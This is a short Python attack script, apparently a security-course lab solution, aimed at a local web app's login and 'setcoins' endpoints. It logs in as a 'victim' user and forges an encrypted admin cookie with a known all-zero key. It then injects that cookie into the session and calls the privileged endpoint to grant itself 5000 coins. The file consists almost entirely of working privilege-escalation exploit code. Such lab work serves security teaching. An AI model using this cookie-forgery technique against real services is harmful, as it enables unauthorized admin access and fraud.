from requests import codes, Session
import requests

import app.api.encr_decr

LOGIN_FORM_URL = "http://localhost:8080/login"
SETCOINS_FORM_URL = "http://localhost:8080/setcoins"

def do_login_form(sess, username,password):
    data_dict = {"username":username,\
      "password":password,\
      "login":"Login"
    }
    response = sess.post(LOGIN_FORM_URL,data_dict)
    return response.status_code == codes.ok

def do_setcoins_form(sess,uname, coins):
    data_dict = {"username":uname,\
    "amount":str(coins),\
    }
    response = sess.post(SETCOINS_FORM_URL, data_dict)
    print("Response code: {}".format(response.status_code))
    return response.status_code == codes.ok

def do_attack():
    sess = Session()
    print("Cookie pre logon: {}".format(sess.cookies.get_dict()))
    # TODO: you'll need to change this to a non-admin user, such as 'victim'.
    uname ="victim"
    pw = "victim"
    assert(do_login_form(sess, uname,pw))
    print("Cookies after logon: {}".format(sess.cookies.get_dict()))
    
    # TODO: Maul the admin cookie in the 'sess' object here
    # Initialize the CBC with our encryption key
    encryption_key = b'\x00' * 16
    cbc = app.api.encr_decr.Encryption(encryption_key)
    
    # Admin bytes 0x00 (not admin) or 0x01 (admin) concatentated with plaintext password
    admin_cookie_pt = app.api.encr_decr.format_plaintext(int(True), pw)
    print("admin cookie plaintext: "+ str(admin_cookie_pt))
    ctxt = cbc.encrypt(admin_cookie_pt)
    print("Cipher text: {}".format(ctxt))
    # response.set_cookie("admin", ctxt.hex())
    
    # Don't lose session cookie
    sess_cookie = sess.cookies.get_dict()["session"]
    print("Session cookie: {}".format(sess_cookie))
    jar = requests.cookies.RequestsCookieJar()
    jar.set("admin", None)
    jar.set("admin", ctxt.hex())
    jar.set("session", sess_cookie)
    sess.cookies = jar
    print("Cookies after encryption and setting: {}".format(sess.cookies.get_dict()))
    
    # Send myself 5000 coins via the admin's power
    target_uname = uname
    amount = 5000
    result = do_setcoins_form(sess, target_uname, amount)
    print("result: {}".format(result))
    print("Attack successful? " + str(result))

if __name__=='__main__':
    do_attack()
